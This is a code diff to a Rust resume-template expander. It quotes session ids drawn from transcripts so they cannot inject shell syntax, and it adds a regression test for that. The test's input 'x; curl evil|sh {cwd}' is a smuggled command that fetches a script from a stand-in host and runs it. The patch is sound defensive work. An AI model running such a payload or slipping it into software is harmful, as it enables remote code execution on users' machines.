@@ -137,9 +137,11 @@ pub fn expand_resume_template(template: &str, session: &ResumeSession, cwd: &str
         SourceKind::Kimi => crate::sources::kimi::resume_session_id(session.session_id),
         _ => session.session_id,
     };
+    // Session ids come from transcript content and every default template runs
+    // `{session_id}` through a shell, so an id that is not a plain word is quoted.
+    // It is expanded last so placeholders inside the id are never expanded.
     template
         .replace("{claude_env}", &claude_env(session))
-        .replace("{session_id}", session_id)
         .replace("{project}", session.project)
         .replace("{source}", session.source.label())
         .replace("{source_path_shell}", &shell_quote(session.source_path))
@@ -148,6 +150,20 @@ pub fn expand_resume_template(template: &str, session: &ResumeSession, cwd: &str
         .replace("{source_dir}", session.source_dir)
         .replace("{cwd_shell}", &shell_quote(cwd))
         .replace("{cwd}", cwd)
+        .replace("{session_id}", &shell_word(session_id))
+}
+
+/// `value` unchanged when the shell reads it as one literal word, otherwise quoted.
+fn shell_word(value: &str) -> std::borrow::Cow<'_, str> {
+    let plain = !value.is_empty()
+        && value
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || "-_.:@+=,/".contains(ch));
+    if plain {
+        std::borrow::Cow::Borrowed(value)
+    } else {
+        std::borrow::Cow::Owned(shell_quote(value))
+    }
 }
 
 /// The config directory a local Claude session resumes in: the parent of the configured
@@ -239,6 +255,19 @@ mod tests {
             "/work",
         );
         assert_eq!(out, "claude abc-123 memex /logs/it's.jsonl /logs /work");
+    }
+
+    #[test]
+    fn session_ids_from_transcripts_cannot_inject_shell_syntax() {
+        let session = ResumeSession {
+            session_id: "x; curl evil|sh {cwd}",
+            ..session()
+        };
+        let template = default_resume_template("codex", true).unwrap();
+        assert_eq!(
+            expand_resume_template(&template, &session, "/work"),
+            "codex resume 'x; curl evil|sh {cwd}'"
+        );
     }
 
     #[test]
